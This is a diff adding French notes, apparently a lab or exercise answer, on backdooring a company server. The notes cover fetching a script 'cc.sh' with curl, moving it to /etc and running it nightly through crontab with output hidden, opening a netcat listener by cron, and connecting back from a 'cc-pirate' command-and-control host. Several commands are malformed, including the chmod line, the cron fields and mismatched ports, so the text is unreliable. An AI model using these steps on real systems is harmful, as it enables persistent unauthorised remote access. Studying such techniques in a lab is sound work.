@@ -155,7 +155,43 @@ echo 'hinataestnul' > pots_de_vinnaruto.xlsx
 
 
 
+A10)
 
+
+
+
+Serveur entreprise :
+
+curl github..../cc.sh > cc.sh
+chmod 777 > cc.sh
+mv cc.sh /etc
+//lister les actions du fichier crontab
+sudo crontab -l 
+
+sudo export EDITOR=nano
+sudo crontab -e
+
+
+
+
+
+H 3 * * * /etc/cc.sh &> /dev/null
+
+
+// ou
+H 3 * * * nc -l -p 5659 &> /dev/null
+
+
+// ou
+
+00 3 * * * /etc/cc.sh &> /dev/null
+
+
+Serveur CC :
+
+nc $ipsrventreprise 5689
+
+## définitions des IP
 
 177.16.1.5 cc-pirate
 <!-- 177.16.1.3 pirate  *obsolète* -->
